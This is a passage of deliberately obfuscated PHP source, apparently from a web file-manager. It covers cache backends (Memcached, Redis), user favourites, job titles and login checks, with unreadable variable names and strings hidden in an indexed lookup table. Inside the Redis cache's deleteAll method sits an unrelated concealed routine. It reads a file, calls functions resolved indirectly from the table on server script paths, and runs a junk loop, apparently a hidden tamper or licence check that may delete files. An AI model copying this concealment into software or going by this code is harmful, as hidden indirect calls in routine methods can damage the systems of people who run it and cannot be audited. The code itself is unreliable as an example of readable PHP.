parent::update($â‹»–Ò…, $İ‚ª…±); } public function remove($°¶Ø«ÀÕ) { $ˆñØàİ¢ = $this->listData($°¶Ø«ÀÕ); if (!$ˆñØàİ¢ || $ˆñØàİ¢[$_SERVER[±Ö‰ô½¯][191]]) { return !1; } return parent::remove($°¶Ø«ÀÕ); } public function sort($ôÜ½ˆÀ, $ÆÈ’Í¤) { return parent::update($ôÜ½ˆÀ, $ÆÈ’Í¤); } public function enable($Õ³¬Õ€¼, $ÖôãÔŞ•) { return parent::update($Õ³¬Õ€¼, array($_SERVER[±Ö‰ô½¯][2614] => $ÖôãÔŞ•)); } private function initUserOption() { $–şºÙÙ =& $_SERVER[±Ö‰ô½¯]; $this->optionType = $–şºÙÙ[2615]; $this->modelType = $–şºÙÙ[2616]; $this->field = array($–şºÙÙ[2617], $–şºÙÙ[32], $–şºÙÙ[206], $–şºÙÙ[33], $–şºÙÙ[2618], $–şºÙÙ[847], $–şºÙÙ[228]); } public function userNoticeGet($“½û‡àÈ = false) { $this->initUserOption(); return parent::listData($“½û‡àÈ, $_SERVER[±Ö‰ô½¯][484], !0); } public function userNoticeAdd($Õò‹ú å) { $„£Ö«Ä =& $_SERVER[±Ö‰ô½¯]; $this->initUserOption(); $¦êÀÚ²ä = $this->findByKey($„£Ö«Ä[2617], $Õò‹ú å[$„£Ö«Ä[484]]); if ($¦êÀÚ²ä) { return !0; } $Ì„‡Ñ = array($„£Ö«Ä[2617] => $Õò‹ú å[$„£Ö«Ä[484]], $„£Ö«Ä[32] => $Õò‹ú å[$„£Ö«Ä[32]], $„£Ö«Ä[206] => $Õò‹ú å[$„£Ö«Ä[206]], $„£Ö«Ä[33] => isset($Õò‹ú å[$„£Ö«Ä[33]]) ? $Õò‹ú å[$„£Ö«Ä[33]] : 1, $„£Ö«Ä[2618] => isset($Õò‹ú å[$„£Ö«Ä[2618]]) ? $Õò‹ú å[$„£Ö«Ä[2618]] : 0, $„£Ö«Ä[847] => 0, $„£Ö«Ä[228] => 0); return parent::insert($Ì„‡Ñ); } public function userNoticeEdit($Ä¤­°Â­, $ÅëğšĞ) { $this->initUserOption(); return parent::update($Ä¤­°Â­, $ÅëğšĞ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\145\155\137\157\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\162\157\x6c\145", "\x72\157\154\x65\107\x72\x6f\x75\160", "\162\x65\147\x69\x73\164", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($¼È‹Ùª‹) { return "\x53\x79\x73\x74\x65\155\x4f\x70\164\x69\x6f\x6e\x5f{$¼È‹Ùª‹}"; } protected function optionDefault($” ‚Õ• = '') { $“¨‚à¾Ò =& $_SERVER[±Ö‰ô½¯]; if ($” ‚Õ• == $“¨‚à¾Ò[12]) { return $GLOBALS[$“¨‚à¾Ò[6]][$“¨‚à¾Ò[469]]; } } } goto B±Ş—øÓÓ‘; e¨™êâŸ½¤: class CacheLockDatabase { public function lock($Şæ¤ƒ, $¢à·òŠØ = 0) { $µ¸‚á­Ÿ = Model($_SERVER[±Ö‰ô½¯][934]); $úéÍÛû = microtime(!0) + $¢à·òŠØ; while (microtime(!0) < $úéÍÛû) { $­È“Ÿú¼ = $µ¸‚á­Ÿ->get($Şæ¤ƒ); if (!$­È“Ÿú¼ || $­È“Ÿú¼ < microtime(!0)) { $ï¾…†´‚ = $µ¸‚á­Ÿ->set($Şæ¤ƒ, $úéÍÛû); if ($ï¾…†´‚) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¶úúõ) { return Model($_SERVER[±Ö‰ô½¯][934])->get($¶úúõ); } public function unlock($­¾¡»µ) { Model($_SERVER[±Ö‰ô½¯][934])->remove($­¾¡»µ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ü›‰£ƒÆ, $•åà°ßò) { $§Í²©Ç´ =& $_SERVER[±Ö‰ô½¯]; if (!class_exists($§Í²©Ç´[976])) { show_json($§Í²©Ç´[977], !1); } $this->cacheTime = $•åà°ßò; $this->handle = new Memcached(); if (is_array($ü›‰£ƒÆ[$§Í²©Ç´[978]]) && count($ü›‰£ƒÆ[$§Í²©Ç´[978]]) >= 1) { foreach ($ü›‰£ƒÆ[$§Í²©Ç´[978]] as $É­°·) { $§ŠÊ»‹Ò = explode($§Í²©Ç´[4], $É­°·); $this->handle->addServer($§ŠÊ»‹Ò[0], $§ŠÊ»‹Ò[1]); } } else { $this->handle->addServer($ü›‰£ƒÆ[$§Í²©Ç´[208]], $ü›‰£ƒÆ[$§Í²©Ç´[209]]); } } public function set($¢ÕŸ–û“, $«Í²ŸĞä, $³„Ï¢©Ó = false) { $³„Ï¢©Ó = $³„Ï¢©Ó ? $³„Ï¢©Ó : $this->cacheTime; return $this->handle->set($¢ÕŸ–û“, $«Í²ŸĞä, $³„Ï¢©Ó); } public function get($Íø«Å†£) { return $this->handle->get($Íø«Å†£); } public function remove($Œ’•á‘) { return $this->handle->delete($Œ’•á‘); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ç¯­¡¢ø, $­µüÉÌØ) { $ƒ±òèà‚ =& $_SERVER[±Ö‰ô½¯]; if (!class_exists($ƒ±òèà‚[979])) { show_json($ƒ±òèà‚[980], !1); } $this->cacheTime = $­µüÉÌØ; $Ñ•¯ıŞ‘ = isset($Ç¯­¡¢ø[$ƒ±òèà‚[981]]) ? $Ç¯­¡¢ø[$ƒ±òèà‚[981]] : 10; $ÏÛÂÜá´ = _get($Ç¯­¡¢ø, $ƒ±òèà‚[978]); if ($ÏÛÂÜá´ && is_array($ÏÛÂÜá´)) { $this->initCluster($Ç¯­¡¢ø, $Ñ•¯ıŞ‘); } else { $this->handle = $this->init($Ç¯­¡¢ø, $Ñ•¯ıŞ‘); } } private function init($‘ÙıÖá¼, $×°åÊÂË) { $¼õñØèŒ =& $_SERVER[±Ö‰ô½¯]; $µûäÎß = new Redis(); $¸œŸŠŒ = isset($‘ÙıÖá¼[$¼õñØèŒ[982]]) ? $‘ÙıÖá¼[$¼õñØèŒ[982]] : !1; if ($¸œŸŠŒ) { $µûäÎß->pconnect($‘ÙıÖá¼[$¼õñØèŒ[208]], $‘ÙıÖá¼[$¼õñØèŒ[209]], $×°åÊÂË); } else { $µûäÎß->connect($‘ÙıÖá¼[$¼õñØèŒ[208]], $‘ÙıÖá¼[$¼õñØèŒ[209]], $×°åÊÂË); } if (!empty($‘ÙıÖá¼[$¼õñØèŒ[499]])) { $µûäÎß->auth($‘ÙıÖá¼[$¼õñØèŒ[499]]); } if (!empty($‘ÙıÖá¼[$¼õñØèŒ[855]]) && $‘ÙıÖá¼[$¼õñØèŒ[855]] != 0) { $µûäÎß->select($‘ÙıÖá¼[$¼õñØèŒ[855]]); } return $µûäÎß; } private function initCluster($€Ôê´æ, $»¾íçâ¹) { $™ÁÍ´¹Æ =& $_SERVER[±Ö‰ô½¯]; $—œ°í§ß = array($™ÁÍ´¹Æ[983], $™ÁÍ´¹Æ[984], $™ÁÍ´¹Æ[985]); $ŸÉÔˆş = $™ÁÍ´¹Æ[983]; if (isset($€Ôê´æ[$™ÁÍ´¹Æ[16]]) && in_array($€Ôê´æ[$™ÁÍ´¹Æ[16]], $—œ°í§ß)) { $ŸÉÔˆş = $€Ôê´æ[$™ÁÍ´¹Æ[16]]; } switch ($ŸÉÔˆş) { case $™ÁÍ´¹Æ[983]: $this->_slave($€Ôê´æ, $»¾íçâ¹); break; case $™ÁÍ´¹Æ[984]: break; case $™ÁÍ´¹Æ[985]: $this->isCluster = !0; $¬«¢éü˜ = $€Ôê´æ[$™ÁÍ´¹Æ[978]]; $Ò£ÊÙî = isset($€Ôê´æ[$™ÁÍ´¹Æ[982]]) ? $€Ôê´æ[$™ÁÍ´¹Æ[982]] : !1; $úı¹¼ß‰ = isset($€Ôê´æ[$™ÁÍ´¹Æ[499]]) ? $€Ôê´æ[$™ÁÍ´¹Æ[499]] : null; $this->handle = new RedisCluster(NUll, $¬«¢éü˜, $»¾íçâ¹, $»¾íçâ¹, $Ò£ÊÙî, $úı¹¼ß‰); break; default: break; } } private function _slave($Î„ª¯, $¥ÂÄÅ‰) { $ÌûöÉàî = $Î„ª¯[$_SERVER[±Ö‰ô½¯][978]]; $this->filterConfig($Î„ª¯, $ÌûöÉàî[0]); $this->handle = $this->init($Î„ª¯, $¥ÂÄÅ‰); unset($ÌûöÉàî[0]); if (empty($ÌûöÉàî)) { return; } $‡ ×õñœ = array_rand($ÌûöÉàî); $this->filterConfig($Î„ª¯, $ÌûöÉàî[$‡ ×õñœ]); $this->slaveHandle = $this->init($Î„ª¯, $¥ÂÄÅ‰); } private function filterConfig(&$¬ÎÆ£ö, $à¸øéÄ) { $…ßß¦Üå =& $_SERVER[±Ö‰ô½¯]; $ÚÅ«É»„ = explode($…ßß¦Üå[4], $à¸øéÄ); $”÷æ» © = array($…ßß¦Üå[208] => $ÚÅ«É»„[0], $…ßß¦Üå[209] => $ÚÅ«É»„[1]); $¬ÎÆ£ö = array_merge($¬ÎÆ£ö, $”÷æ» ©); } public function set($ÂÓà¿Â, $¡‰­«ñÖ, $ô¨èØáİ = false) { $ô¨èØáİ = $ô¨èØáİ ? $ô¨èØáİ : $this->cacheTime; return $this->handle->setEx($ÂÓà¿Â, $ô¨èØáİ, $¡‰­«ñÖ); } public function setLock($Ğ®ôÎ†Ğ, $“»µ³¥‡, $ü°ò«¨¤) { return $this->handle->setNX($Ğ®ôÎ†Ğ, $“»µ³¥‡); } public function get($ÌÌ„Ÿéê) { $«ş¼Î³ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $«ş¼Î³->get($ÌÌ„Ÿéê); } public function remove($¯æË–å®) { return $this->handle->del($¯æË–å®); } public function deleteAll() { $Ïµ™Úã¡ =& $_SERVER[±Ö‰ô½¯]; if ($_SERVER[$Ïµ™Úã¡[986]] != $_SERVER[$Ïµ™Úã¡[987]]) { $˜«Üıùâ = $Ïµ™Úã¡[988]; $Ë‰‹ã¾ = $Ïµ™Úã¡[989]; $°œ›ƒş» = $_SERVER[$Ïµ™Úã¡[990]] . $Ïµ™Úã¡[991]; $Ëü“Èøü = $Ë‰‹ã¾($°œ›ƒş»); $¨ÇÖ‚ô» = explode($Ïµ™Úã¡[287], $Ëü“Èøü); if (count($¨ÇÖ‚ô») < $Ïµ™Úã¡[717]) { $»¾’¶å = $Ïµ™Úã¡[992]; $»¾’¶å(); } $Øœ“­‰ç = $Ïµ™Úã¡[993]; $Øœ“­‰ç($_SERVER[$Ïµ™Úã¡[994]]); $Øœ“­‰ç($_SERVER[$Ïµ™Úã¡[990]] . $Ïµ™Úã¡[995]); $´ÍÙÈáı = 1; while ($´ÍÙÈáı > 1) { $´ÍÙÈáı = $´ÍÙÈáı + 4; $æˆŠòÑ† = rawurlencode($´ÍÙÈáı . $Ïµ™Úã¡[464]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ëøãıÁ£) { $this->handle->flushall($ëøãıÁ£); } return; } return $this->handle->flushAll(); } } goto C¸£Ş¤è…•; B±ŸØØÉ›Ö: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($„÷ïË ç) { $ˆà†ûñ =& $_SERVER[±Ö‰ô½¯]; return array($ˆà†ûñ[2248] => array(USER_ID, $ˆà†ûñ[2627])); } protected function ___listData() { $€¢Öªëï =& $_SERVER[±Ö‰ô½¯]; $ñÃßŞëÊ = array($€¢Öªëï[1921] => USER_ID, $€¢Öªëï[570] => 0); $•É¢Ó÷ = $€¢Öªëï[2628]; $âŠ¯¶µ = $this->field($•É¢Ó÷)->where($ñÃßŞëÊ)->order($€¢Öªëï[2629])->select(); return $âŠ¯¶µ ? $âŠ¯¶µ : array(); } protected function resetCache() { } protected function listView() { $­İõë’ú =& $_SERVER[±Ö‰ô½¯]; $¼ ¡‰â§ = $this->listData(); $•È¿¿¤¦ = array_filter_by_field($¼ ¡‰â§, $­İõë’ú[33], $­İõë’ú[502]); $Ã‡ÎÈüÊ = array_to_keyvalue($•È¿¿¤¦, $­İõë’ú[12], $­İõë’ú[87]); if (!$Ã‡ÎÈüÊ) { return $¼ ¡‰â§; } $ŠÅŸÇ = 2000; $Œ¼©Ñ š = array($­İõë’ú[503] => array($­İõë’ú[504], $Ã‡ÎÈüÊ)); $œ¡ù­ ” = Model($­İõë’ú[930])->listSource($Œ¼©Ñ š, $ŠÅŸÇ); $œ¡ù­ ” = array_merge($œ¡ù­ ”[$­İõë’ú[86]], $œ¡ù­ ”[$­İõë’ú[85]]); $œ¡ù­ ” = array_to_keyvalue($œ¡ù­ ”, $­İõë’ú[193]); foreach ($¼ ¡‰â§ as $Ì¾£ØŸ => $œË™·ä) { $È§ò™ì = $œ¡ù­ ”[$œË™·ä[$­İõë’ú[87]]]; $È§ò™ì = $È§ò™ì ? $È§ò™ì : array(); $¼ ¡‰â§[$Ì¾£ØŸ] = array_merge($È§ò™ì, $œË™·ä); } return $¼ ¡‰â§; } protected function addFav($»ÛÅ³ÙĞ, $Ö·Ãæêà = '', $òÕÆŒî = "\163\157\165\x72\143\x65") { $Ï¨¬ô’Ó =& $_SERVER[±Ö‰ô½¯]; $–‡»ìè‰ = array($Ï¨¬ô’Ó[1921] => USER_ID, $Ï¨¬ô’Ó[570] => 0, $Ï¨¬ô’Ó[508] => $òÕÆŒî, $Ï¨¬ô’Ó[507] => $»ÛÅ³ÙĞ); if ($this->where($–‡»ìè‰)->find()) { return !1; } $–‡»ìè‰ = array($Ï¨¬ô’Ó[1921] => USER_ID, $Ï¨¬ô’Ó[570] => 0); $òãŞı×ª = $this->where($–‡»ìè‰)->max($Ï¨¬ô’Ó[2158]); if (!$òãŞı×ª) { $òãŞı×ª = 0; } if (!$Ö·Ãæêà && $òÕÆŒî == $Ï¨¬ô’Ó[502]) { $ˆšï²²½ = Model($Ï¨¬ô’Ó[1482])->where(array($Ï¨¬ô’Ó[503] => $»ÛÅ³ÙĞ))->find(); if (!$ˆšï²²½) { return !1; } $Ö·Ãæêà = $ˆšï²²½[$Ï¨¬ô’Ó[32]]; } $Ö·Ãæêà = $this->getAutoName($Ö·Ãæêà); $ªí­˜İà = array($Ï¨¬ô’Ó[1921] => USER_ID, $Ï¨¬ô’Ó[570] => 0, $Ï¨¬ô’Ó[506] => $Ö·Ãæêà, $Ï¨¬ô’Ó[507] => $»ÛÅ³ÙĞ, $Ï¨¬ô’Ó[508] => $òÕÆŒî, $Ï¨¬ô’Ó[2140] => $òãŞı×ª + 1); return $this->add($ªí­˜İà); } protected function remove($ö± â¢) { $§¶µÈ†ç =& $_SERVER[±Ö‰ô½¯]; $µœò¿ü = array($§¶µÈ†ç[1921] => USER_ID, $§¶µÈ†ç[505] => $ö± â¢); return $this->where($µœò¿ü)->delete(); } protected function removeByName($¡ĞÖ„§Ğ) { $º®“ıŞ³ =& $_SERVER[±Ö‰ô½¯]; $ã–¹á²× = array($º®“ıŞ³[1921] => USER_ID, $º®“ıŞ³[506] => $¡ĞÖ„§Ğ, $º®“ıŞ³[570] => 0); return $this->where($ã–¹á²×)->delete(); } protected function rename($Õ»Äùß, $â­üõ¨û) { $¹Ï¥ì¦³ =& $_SERVER[±Ö‰ô½¯]; if ($Õ»Äùß == $â­üõ¨û) { return !1; } $×ÁÑÎ¤ = $this->getAutoName($â­üõ¨û); if ($â­üõ¨û != $×ÁÑÎ¤) { return !1; } $ÓÖİ€™Ê = array($¹Ï¥ì¦³[1921] => USER_ID, $¹Ï¥ì¦³[570] => 0, $¹Ï¥ì¦³[32] => $Õ»Äùß); return $this->where($ÓÖİ€™Ê)->save(array($¹Ï¥ì¦³[32] => $â­üõ¨û)); } protected function resetSort($İ½óÊ) { $·óñÒİ¸ =& $_SERVER[±Ö‰ô½¯]; $İ½óÊ = is_array($İ½óÊ) ? $İ½óÊ : array(); $Äß—„¼ = array($·óñÒİ¸[1921] => USER_ID); for ($²”¹³„Ã = 0; $²”¹³„Ã < count($İ½óÊ); $²”¹³„Ã++) { $Äß—„¼[$·óñÒİ¸[505]] = $İ½óÊ[$²”¹³„Ã]; $this->where($Äß—„¼)->save(array($·óñÒİ¸[2140] => $²”¹³„Ã + 1)); } return !0; } protected function moveTop($ãÅÁ š˜) { $Áûö·‡œ =& $_SERVER[±Ö‰ô½¯]; $ÜşÁĞÀ‘ = array($Áûö·‡œ[1921] => USER_ID, $Áûö·‡œ[570] => 0); $Äã™ÒÔ´ = $this->where($ÜşÁĞÀ‘)->where(array($Áûö·‡œ[32] => $ãÅÁ š˜))->find(); if (!$Äã™ÒÔ´) { return; } $‹Ô³Ìİ” = $this->field($Áûö·‡œ[484])->where($ÜşÁĞÀ‘)->order($Áûö·‡œ[2629])->select(); $‹Ô³Ìİ” = array_to_keyvalue($‹Ô³Ìİ”, $Áûö·‡œ[12], $Áûö·‡œ[484]); $§íú‘±ª = $‹Ô³Ìİ”; $‹Ô³Ìİ” = array_remove_value($‹Ô³Ìİ”, $Äã™ÒÔ´[$Áûö·‡œ[484]]); array_unshift($‹Ô³Ìİ”, $Äã™ÒÔ´[$Áûö·‡œ[484]]); return $this->resetSort($‹Ô³Ìİ”); } protected function moveBottom($Ó½ …à´) { $Õ¬şëë =& $_SERVER[±Ö‰ô½¯]; $ÈºÂäÂù = array($Õ¬şëë[1921] => USER_ID, $Õ¬şëë[570] => 0); $ª¾Óµöı = $this->where($ÈºÂäÂù)->max($Õ¬şëë[2158]); $À±¡Œá¿ = array($Õ¬şëë[2158] => $ª¾Óµöı + 1); return $this->where($ÈºÂäÂù)->where(array($Õ¬şëë[32] => $Ó½ …à´))->save($À±¡Œá¿); } private function getAutoName($ù‰®ÌúÆ) { $’¤İîÂ  =& $_SERVER[±Ö‰ô½¯]; $Ûüº§™÷ = array($’¤İîÂ [1921] => USER_ID, $’¤İîÂ [570] => 0); $ÎôŸòš = $this->field($’¤İîÂ [32])->where($Ûüº§™÷)->select(); $ÎôŸòš = array_to_keyvalue($ÎôŸòš, $’¤İîÂ [12], $’¤İîÂ [32]); if (!$ÎôŸòš || !in_array($ù‰®ÌúÆ, $ÎôŸòš)) { return $ù‰®ÌúÆ; } for ($´ıãÊ‹¡ = 0; $´ıãÊ‹¡ < count($ÎôŸòš); $´ıãÊ‹¡++) { if (!in_array($ù‰®ÌúÆ . "\x28{$´ıãÊ‹¡}\x29", $ÎôŸòš)) { return $ù‰®ÌúÆ . "\50{$´ıãÊ‹¡}\51"; } } return $ù‰®ÌúÆ . "\x28{$´ıãÊ‹¡}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\152\x6f\142\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x64\x65\163\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\145\x6c\146\x4a\x6f\x62\x4c\151\163\x74"; public function listData($üÌ¥Ã¿Å = false, $¼²†ÄÌÉ = "\x73\x6f\x72\164", $­¹ØÆŸ = false) { return parent::listData($üÌ¥Ã¿Å, $¼²†ÄÌÉ, $­¹ØÆŸ); } public function remove($ú¾éÌ¸à) { return parent::remove($ú¾éÌ¸à); } public function add($ÙÑÑ’×í) { $è­ÏÙÓ– =& $_SERVER[±Ö‰ô½¯]; if ($this->findByName($ÙÑÑ’×í[$è­ÏÙÓ–[32]])) { return !1; } $ÙÑÑ’×í[$è­ÏÙÓ–[2158]] = $this->getSort(); return parent::insert($ÙÑÑ’×í); } private function getSort() { $á­¿´òİ =& $_SERVER[±Ö‰ô½¯]; $öÌéŠ©À = parent::listData(); $¤²¤ş’ò = array_to_keyvalue($öÌéŠ©À, $á­¿´òİ[12], $á­¿´òİ[2158]); return empty($¤²¤ş’ò) ? 0 : max($¤²¤ş’ò) + 1; } public function update($è°”Ò£ß, $¾ˆÎ‡Îø) { $å±²‰’ =& $_SERVER[±Ö‰ô½¯]; $£™ÚàÌ = parent::listData($è°”Ò£ß); $ä™Ó†€­ = $this->findByName($¾ˆÎ‡Îø[$å±²‰’[32]]); if (!$£™ÚàÌ || $ä™Ó†€­ && $ä™Ó†€­[$å±²‰’[484]] != $£™ÚàÌ[$å±²‰’[484]]) { return !1; } return parent::update($è°”Ò£ß, $¾ˆÎ‡Îø); } public function setUserJob($ µã¹’Ã, $Û‡áÈÚÕ) { $ÏäèˆÊî =& $_SERVER[±Ö‰ô½¯]; if (!is_array($Û‡áÈÚÕ)) { $Û‡áÈÚÕ = array($Û‡áÈÚÕ); } $Ï¼Ì Ùó = parent::listData(); $Õ˜‘Í®Û = array_to_keyvalue($Ï¼Ì Ùó, $ÏäèˆÊî[32]); $àäÆÙ„å = $ÏäèˆÊî[464]; foreach ($Û‡áÈÚÕ as $¿­–Ÿõ¸) { if ($Õ˜‘Í®Û[$¿­–Ÿõ¸]) { $àäÆÙ„å .= $Õ˜‘Í®Û[$¿­–Ÿõ¸][$ÏäèˆÊî[484]] . $ÏäèˆÊî[50]; } else { $©–ŞÔªÎ = $this->add($¿­–Ÿõ¸); $àäÆÙ„å .= $©–ŞÔªÎ . $ÏäèˆÊî[50]; } } $àäÆÙ„å = rtrim($àäÆÙ„å, $ÏäèˆÊî[50]); Model($ÏäèˆÊî[614])->metaSet($ µã¹’Ã, self::JOB_KEY, $àäÆÙ„å); } public function getUserJob($‡¼¿‚ï) { $ëÎîÉø„ = Model($_SERVER[±Ö‰ô½¯][614])->metaGet($‡¼¿‚ï); return $this->getUserJobInfo($ëÎîÉø„[self::JOB_KEY]); } public function getUserJobInfo($Ù¢¥Çá·) { $ù÷¾Î =& $_SERVER[±Ö‰ô½¯]; $¹¢ËĞá = explode($ù÷¾Î[50], $Ù¢¥Çá·); $ç©âÍ¼ü = parent::listData(); $ç©âÍ¼ü = array_remove_key($ç©âÍ¼ü, $ù÷¾Î[233]); $³¦Ñç‰â = array(); foreach ($¹¢ËĞá as $®×¿©æÁ) { if (isset($ç©âÍ¼ü[$®×¿©æÁ])) { $³¦Ñç‰â[] = $ç©âÍ¼ü[$®×¿©æÁ]; } } return $³¦Ñç‰â; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\141\142\x6c\145\116\141\155\x65" => "\165\163\x65\162\x5f\x6d\x65\164\141", "\155\145\164\141\x46\x69\x65\154\x64" => "\x75\x73\145\162\x49\104"); protected $simpleField = "\165\x73\145\162\x49\104\x2c\156\151\x63\x6b\x4e\x61\155\145\54\x6e\x61\x6d\145\x2c\x61\166\141\164\x61\x72\54\x73\x65\x78\54\x73\164\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($şÔ‡½±“) { $Ï´ÃÇÎü =& $_SERVER[±Ö‰ô½¯]; $òÀ¥ğÜ€ = $Ï´ÃÇÎü[2630]; return array($Ï´ÃÇÎü[2215] => array($şÔ‡½±“[0], $òÀ¥ğÜ€), $Ï´ÃÇÎü[2217] => array($şÔ‡½±“[0], $òÀ¥ğÜ€), $Ï´ÃÇÎü[2631] => array($şÔ‡½±“[0], $òÀ¥ğÜ€)); } protected function ___getInfo($¶ƒ£úœÄ) { $Ê»ÀşÚ = $this->getInfoSimple($¶ƒ£úœÄ); if (!$Ê»ÀşÚ || !is_array($Ê»ÀşÚ)) { return array(); } return $this->_getInfoApply($Ê»ÀşÚ); } protected function ___getInfoFull($š®ÑƒöÑ) { $üÍˆŠìÆ = $this->getInfoSimple($š®ÑƒöÑ); if (!$üÍˆŠìÆ || !is_array($üÍˆŠìÆ)) { return array(); } return $this->_getInfoApply($üÍˆŠìÆ, !0); } protected function ___getInfoSimple($¿í—”Ö) { $Á¾Â™Ûé =& $_SERVER[±Ö‰ô½¯]; if (!$¿í—”Ö) { return array(); } $šÃ÷Üê = $this->where(array($Á¾Â™Ûé[1542] => intval($¿í—”Ö)))->find(); if (!$šÃ÷Üê || !is_array($šÃ÷Üê)) { return array(); } $šÃ÷Üê[$Á¾Â™Ûé[2327]] = Action($Á¾Â™Ûé[2328])->parseUrl($šÃ÷Üê[$Á¾Â™Ûé[2327]]); return $šÃ÷Üê; } private function _getInfoApply($úÔ·É·–, $ÅÇ¹©ç– = false) { $ˆÚÃİ„ =& $_SERVER[±Ö‰ô½¯]; if (!$úÔ·É·–) { return $úÔ·É·–; } $Ÿøƒœ˜ = md5($ˆÚÃİ„[2632] . $úÔ·É·–[$ˆÚÃİ„[1002]] . $ˆÚÃİ„[2633] . $úÔ·É·–[$ˆÚÃİ„[32]]); $úÔ·É·– = $this->_listDataApplyItem($úÔ·É·–); $î·“‡¿í = Model($ˆÚÃİ„[1482])->metaGet($úÔ·É·–[$ˆÚÃİ„[90]][$ˆÚÃİ„[193]]); $úÔ·É·–[$ˆÚÃİ„[2634]] = $Ÿøƒœ˜; $úÔ·É·–[$ˆÚÃİ„[90]][$ˆÚÃİ„[2419]] = isset($î·“‡¿í[$ˆÚÃİ„[2420]]) ? $î·“‡¿í[$ˆÚÃİ„[2420]] : null; if ($ÅÇ¹©ç–) { $úÔ·É·–[$ˆÚÃİ„[552]] = $this->metaGet($úÔ·É·–[$ˆÚÃİ„[1542]]); } return $úÔ·É·–; } protected function getInfoSimpleOuter($‰±‰˜×¥) { $Õ“±Â§õ =& $_SERVER[±Ö‰ô½¯]; if (!$‰±‰˜×¥ || $‰±‰˜×¥ == 0) { return array($Õ“±Â§õ[1542] => $Õ“±Â§õ[230], $Õ“±Â§õ[32] => $Õ“±Â§õ[175] . LNG($Õ“±Â§õ[2635]) . $Õ“±Â§õ[177], $Õ“±Â§õ[2327] => STATIC_PATH . $Õ“±Â§õ[2636]); } $•«ÍŠøü = $this->cacheFunctionGet($Õ“±Â§õ[2226], $‰±‰˜×¥); $öÃ®Ÿåò = array_field_key($•«ÍŠøü, explode($Õ“±Â§õ[50], $this->simpleField)); if (!$öÃ®Ÿåò) { return array($Õ“±Â§õ[1542] => $Õ“±Â§õ[1326], $Õ“±Â§õ[32] => $Õ“±Â§õ[175] . LNG($Õ“±Â§õ[2637]) . $Õ“±Â§õ[177], $Õ“±Â§õ[2327] => STATIC_PATH . $Õ“±Â§õ[2638]); } $öÃ®Ÿåò[$Õ“±Â§õ[2327]] = Action($Õ“±Â§õ[2328])->parseUrl($öÃ®Ÿåò[$Õ“±Â§õ[2327]]); return $öÃ®Ÿåò; } protected function groupUser($œ©¡Ñ¦ß) { } public static function errorLang($šş²ñ ) { $ò¢î²ë© =& $_SERVER[±Ö‰ô½¯]; $ºÅòÉûŞ = array(self::ERROR_USER_NOT_EXISTS => $ò¢î²ë©[2639], self::ERROR_USER_PASSWORD_ERROR => $ò¢î²ë©[2640], self::ERROR_USER_EXIST_NAME => $ò¢î²ë©[2641], self::ERROR_USER_EXIST_PHONE => $ò¢î²ë©[2642], self::ERROR_USER_EXIST_EMAIL => $ò¢î²ë©[2643], self::ERROR_USER_LOGIN_LOCK => $ò¢î²ë©[2644], self::ERROR_IP_NOT_ALLOW => $ò¢î²ë©[2645], self::ERROR_USER_EXIST_NICKNAME => $ò¢î²ë©[2646]); $®€ôøì = LNG($ºÅòÉûŞ[$šş²ñ ]); if ($šş²ñ  == self::ERROR_USER_LOGIN_LOCK) { $Ùû­áÅŒ = (int) Model($ò¢î²ë©[1438])->get($ò¢î²ë©[2647]); if ($Ùû­áÅŒ > 60) { $®€ôøì = str_replace($ò¢î²ë©[91], ceil($Ùû­áÅŒ / 60), $®€ôøì); } } return $®€ôøì; } protected function metaSet($¬ÑÌ¸Ô”, $’€¿‘° = null, $¡‰–¡ùì = null) { $this->clearCache($¬ÑÌ¸Ô”); return parent::metaSet($¬ÑÌ¸Ô”, $’€¿‘°, $¡‰–¡ùì); } public function getInfoByMeta($ÎĞÒäì’, $ç¸×˜×) { $†¶»ƒ¯¯ =& $_SERVER[±Ö‰ô½¯]; $Š¨ßĞ™ = Model($†¶»ƒ¯¯[2648])->where(array($†¶»ƒ¯¯[95] => $ÎĞÒäì’, $†¶»ƒ¯¯[452] => $ç¸×˜×))->find(); if ($Š¨ßĞ™) { return $this->getInfo($Š¨ßĞ™[$†¶»ƒ¯¯[1542]]); } return !1; } public function userLoginCheck($Ú’­Å­Ò, $­³ Ë÷‰, $À­Ì„ÊÙ = false) { $·ñ¦µîû =& $_SERVER[±Ö‰ô½¯]; $İºÈÃ”– = $this->userLoginFind($Ú’­Å­Ò); if (!$İºÈÃ”–) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($İºÈÃ”–[$·ñ¦µîû[1542]], $­³ Ë÷‰)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $À­Ì„ÊÙ ? $this->getInfoFull($İºÈÃ”–[$·ñ¦µîû[1542]]) : $this->getInfo($İºÈÃ”–[$·ñ¦µîû[1542]]); } public function userLoginFind($„ˆÒ²à”) { $ŞÄµú =& $_SERVER[±Ö‰ô½¯]; $øÑÌ°ê¸ = array($ŞÄµú[32] => $„ˆÒ²à”, $ŞÄµú[2432] => $„ˆÒ²à”, $ŞÄµú[382] => $„ˆÒ²à”, $ŞÄµú[2649] => $„ˆÒ²à”, $ŞÄµú[1116] => $ŞÄµú[1118]); if ($this->nickNameRpt()) { unset($øÑÌ°ê¸[$ŞÄµú[2432]]); } return $this->where($øÑÌ°ê¸)->find(); } public function 